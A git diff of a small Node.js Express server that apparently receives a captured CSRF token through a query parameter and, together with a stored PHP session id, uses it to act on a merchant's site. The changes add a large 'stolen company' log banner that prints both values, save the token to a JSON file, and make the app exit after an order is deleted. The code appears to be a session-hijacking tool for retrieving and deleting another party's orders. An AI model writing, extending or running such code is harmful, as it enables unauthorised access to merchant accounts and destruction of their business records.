@@ -24,17 +24,22 @@ app.get("/", (req, res) => {
     console.log();
     console.log();
     console.log();
-    console.log("----------------------------------");
-    console.log("  <<<<<< stolen company >>>>>>    ");
-    console.log("----------------------------------");
+    console.log("--------------------------------------------------------------------------------------");
+    console.log("--------------------------------------------------------------------------------------");
+    console.log("--------------------------------------------------------------------------------------");
+    console.log("                               <<<<<< stolen company >>>>>>    ");
+    console.log("--------------------------------------------------------------------------------------");
+    console.log("--------------------------------------------------------------------------------------");
+    console.log("--------------------------------------------------------------------------------------");
+    console.log('       YII_CSRF_TOKEN:' + req.query.v, 'phpsessiid:'+configApp.phpsessiid      );
+    console.log("--------------------------------------------------------------------------------------");
     console.log();
     console.log();
     console.log();
+
+    
     getIdOrder();
-    writeFileJSON(
-      "./app/json/tokenMerchant.json",
-      `{"YII_CSRF_TOKEN": "${req.query.v}"}`
-    );
+    writeFileJSON("./app/json/tokenMerchant.json",`{"YII_CSRF_TOKEN": "${req.query.v}"}` );
     webApp(req.query.v, configApp.phpsessiid);
   } else {
     console.log("erro token na requisição!!");
@@ -101,6 +106,8 @@ var deleteOrder = async (idCode) => {
     data: formData,
   });
   console.log(response.data.msg, idCode);
+  console.log('Finlizing application.');
+  process.exit();
 };
 
 var writeFileJSON = (fileName, value) => {
